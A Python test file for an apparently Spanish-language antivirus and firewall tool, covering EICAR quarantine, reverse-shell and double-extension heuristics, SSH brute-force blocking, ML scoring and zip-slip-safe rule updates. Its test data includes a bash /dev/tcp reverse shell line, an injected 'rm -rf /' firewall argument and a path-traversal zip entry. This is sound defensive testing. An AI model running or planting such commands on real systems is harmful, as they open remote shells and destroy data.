import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from escudo.config import Config  # noqa: E402
from escudo.firewall import Firewall  # noqa: E402
from escudo.netguard import NetGuard, extract_attacker_ip  # noqa: E402
from escudo.quarantine import Quarantine  # noqa: E402
from escudo.scanner import Scanner  # noqa: E402
from escudo.signatures import EICAR  # noqa: E402


def cfg(tmp_path):
    return Config(data_dir=tmp_path / "data", exclude_dirs=[], dry_run_firewall=True)


def test_eicar_detected_and_quarantined(tmp_path):
    c = cfg(tmp_path)
    f = tmp_path / "eicar.com"
    f.write_bytes(EICAR)
    dets = Scanner(c).scan_file(str(f))
    assert dets and dets[0].name == "EICAR-Test-File" and dets[0].method == "hash"
    q = Quarantine(c.quarantine_dir)
    qid = q.add(str(f), dets[0].name)
    assert not f.exists() and EICAR not in (c.quarantine_dir / f"{qid}.bin").read_bytes()
    q.restore(qid)
    assert f.read_bytes() == EICAR


def test_heuristics_double_extension_and_reverse_shell(tmp_path):
    c = cfg(tmp_path)
    (tmp_path / "factura.pdf.exe").write_bytes(b"MZ" + b"\0" * 100)
    (tmp_path / "x.sh").write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    names = {d.name for d in Scanner(c).scan(str(tmp_path)).detections}
    assert {"Heur.DoubleExtension", "Linux.ReverseShell.DevTcp"} <= names


def test_bruteforce_blocks_ip(tmp_path):
    c = cfg(tmp_path)
    g = NetGuard(c, Firewall(c))
    line = "sshd[1]: Failed password for root from 203.0.113.7 port 2222 ssh2"
    assert extract_attacker_ip(line) == "203.0.113.7"
    for _ in range(c.bruteforce_threshold):
        g.process_log_line(line)
    assert "203.0.113.7" in g.fw.blocked


def test_whitelist_and_injection_safe(tmp_path):
    c = cfg(tmp_path)
    fw = Firewall(c)
    assert fw.block("127.0.0.1") is False
    try:
        fw.block("1.2.3.4; rm -rf /")
        raise AssertionError("debería rechazar la IP")
    except ValueError:
        pass


def test_ml_layer_is_low_alone_and_high_when_corroborated(tmp_path, monkeypatch):
    from escudo import ml
    c = cfg(tmp_path)
    sc = Scanner(c)
    sc.ml.libs_ok = True
    monkeypatch.setattr(sc.ml, "score", lambda data: ("PE", 0.995))
    exe = tmp_path / "app.exe"
    exe.write_bytes(b"MZ" + b"\0" * 200)
    dets = sc.scan_file(str(exe))
    assert [d.severity for d in dets if d.method == "ml"] == ["low"]           # solo: no cuarentena
    bad = tmp_path / "factura.pdf.exe"
    bad.write_bytes(b"MZ" + b"\0" * 200)
    dets = sc.scan_file(str(bad))
    assert any(d.method == "ml" and d.severity == "high" for d in dets)        # corroborado por heurística
    assert ml.file_kind(b"\x7fELF....") == "ELF" and ml.file_kind(b"%PDF-1.7") == "PDF"


def test_model_hash_mismatch_is_refused(tmp_path):
    from escudo import ml
    d = tmp_path / "modelos"
    d.mkdir()
    (d / ml.MODELS["PE"][0]).write_bytes(b"modelo manipulado")
    eng = ml.MLEngine(d)
    eng.libs_ok = True
    import sys, types
    sys.modules.setdefault("lightgbm", types.SimpleNamespace(Booster=lambda **k: object()))
    assert eng._booster("PE") is None


def test_yara_zip_slip_and_compile_gate(tmp_path, monkeypatch):
    import io, zipfile
    from escudo.yara_engine import YaraEngine
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("../../escape.yar", "rule a { condition: true }")
        z.writestr("ok/regla.yar", "rule b { condition: true }")
    payload = buf.getvalue()

    class R:
        def __init__(self, d): self.d = io.BytesIO(d)
        def read(self, n=-1): return self.d.read(n)
        def __enter__(self): return self
        def __exit__(self, *a): pass
    monkeypatch.setattr("urllib.request.urlopen", lambda *a, **k: R(payload))
    eng = YaraEngine(tmp_path / "data" / "yara")
    (tmp_path / "data").mkdir()
    eng.yara = None                       # sin la librería no se compila, pero se instala igual
    assert eng.update() == 2
    assert not (tmp_path / "escape.yar").exists() and (tmp_path / "data/yara/escape.yar").exists()
